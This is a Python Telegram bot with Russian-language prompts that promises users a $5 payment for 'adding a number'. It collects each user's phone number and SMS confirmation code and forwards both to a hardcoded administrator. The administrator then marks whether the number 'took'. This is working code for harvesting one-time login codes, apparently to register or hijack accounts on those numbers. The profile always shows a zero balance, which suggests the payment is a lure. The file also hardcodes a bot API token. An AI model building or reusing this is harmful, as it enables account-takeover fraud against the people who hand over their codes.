import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- НАСТРОЙКИ ---
API_TOKEN = '8766699550:AAGoDhnUQjIpeTls4dfCh5Ys5J-iJ5H1W-w'
ADMIN_ID = 8777986259 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

class OrderSteps(StatesGroup):
    waiting_for_number = State()
    waiting_for_code = State()

# КЛАВИАТУРА МЕНЮ
def get_main_menu():
    builder = ReplyKeyboardBuilder()
    builder.row(KeyboardButton(text="📞 Добавить номер"))
    builder.row(KeyboardButton(text="👤 Профиль"), KeyboardButton(text="Архив 📁"))
    builder.row(KeyboardButton(text="👥 Реферальная система 👥"))
    builder.row(KeyboardButton(text="⌛ Моя очередь ⌛"))
    return builder.as_markup(resize_keyboard=True)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    text = f"😊 Здравствуйте, @{message.from_user.username or 'пользователь'}!\n\n🟣 **Max price:**\n⬆️ **Тип:** моментальная оплата\n📨 **Оплата:** 5$"
    await message.answer(text, reply_markup=get_main_menu(), parse_mode="Markdown")

@dp.message(F.text == "📞 Добавить номер")
async def start_order(message: types.Message, state: FSMContext):
    await message.answer("📲 Введите ваш номер телефона.\n📝 Пример: +79991234567")
    await state.set_state(OrderSteps.waiting_for_number)

@dp.message(OrderSteps.waiting_for_number)
async def process_num(message: types.Message, state: FSMContext):
    num = message.text
    await state.update_data(saved_num=num)
    
    itb = InlineKeyboardBuilder()
    itb.row(InlineKeyboardButton(text="📝 Ввести код из СМС", callback_data="input_code"))
    
    await message.answer("⌛ Номер принят! Ожидайте. Как придет СМС — нажмите кнопку ниже и введите код.", reply_markup=itb.as_markup())
    
    # КНОПКИ ДЛЯ АДМИНА: Встал, Слет, Отклонить
    atb = InlineKeyboardBuilder()
    atb.row(InlineKeyboardButton(text="✅ Встал", callback_data=f"win_{message.from_user.id}"))
    atb.row(InlineKeyboardButton(text="⚠️ Слет", callback_data=f"fail_{message.from_user.id}"))
    atb.row(InlineKeyboardButton(text="❌ Отклонить", callback_data=f"rej_{message.from_user.id}"))
    
    await bot.send_message(ADMIN_ID, f"🔔 **Новый номер!**\nОт: @{message.from_user.username}\nНомер: {num}", reply_markup=atb.as_markup())

@dp.callback_query(F.data == "input_code")
async def ask_code(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer("⌨️ Введите код из СМС:")
    await state.set_state(OrderSteps.waiting_for_code)
    await callback.answer()

@dp.message(OrderSteps.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    data = await state.get_data()
    await message.answer("✅ Код передан! Ожидайте выплату.")
    await bot.send_message(ADMIN_ID, f"📩 **ПРИШЕЛ КОД!**\nНомер: {data.get('saved_num')}\nКОД: {message.text}")
    await state.clear()

# ОБРАБОТКА АДМИН-КНОПОК
@dp.callback_query(F.data.startswith("win_"))
async def admin_win(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    await bot.send_message(user_id, "✅ Ваш номер успешно принят (Встал)! Ожидайте выплату.")
    await callback.message.edit_text(callback.message.text + "\n\n🟢 **СТАТУС: ВСТАЛ**")
    await callback.answer()

@dp.callback_query(F.data.startswith("fail_"))
async def admin_fail(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    await bot.send_message(user_id, "⚠️ Произошел слет. Попробуйте еще раз или используйте другой номер.")
    await callback.message.edit_text(callback.message.text + "\n\n🟡 **СТАТУС: СЛЕТ**")
    await callback.answer()

@dp.callback_query(F.data.startswith("rej_"))
async def admin_reject(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    await bot.send_message(user_id, "❌ Ваш номер отклонен администратором.")
    await callback.message.edit_text(callback.message.text + "\n\n🔴 **СТАТУС: ОТКЛОНЕНО**")
    await callback.answer()

@dp.message(F.text == "👤 Профиль")
async def view_profile(message: types.Message):
    await message.answer(f"👤 Профиль:\n🆔 ID: {message.from_user.id}\n💰 Баланс: 0.00$")

async def main():
    print("--- БОТ ЗАПУЩЕН ---")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
  
